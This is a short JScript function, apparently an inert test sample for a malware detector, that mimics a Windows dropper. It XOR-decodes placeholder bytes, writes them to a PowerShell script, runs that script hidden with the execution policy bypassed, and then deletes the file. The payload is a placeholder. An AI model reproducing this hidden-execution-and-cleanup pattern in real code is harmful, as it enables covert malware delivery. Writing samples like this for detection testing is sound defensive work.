// Static regression control; intentionally never invoked.
function stagedCleanup() {
    var shell = new ActiveXObject("WScript.Shell");
    var fs = new ActiveXObject("Scripting.FileSystemObject");
    var node = {};
    node.dataType = "bin.base64";
    var data = [1, 2, 3], key = [4, 5], result = [];
    for (var i = 0; i < data.length; i++) {
        result.push(data[i] ^ key[i % key.length]);
    }
    var path = "stage" + ".ps1";
    var writer = fs.CreateTextFile(path, true);
    writer.Write(result.join(""));
    writer.Close();
    shell.Exec("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File " + path);
    fs.DeleteFile(path);
}
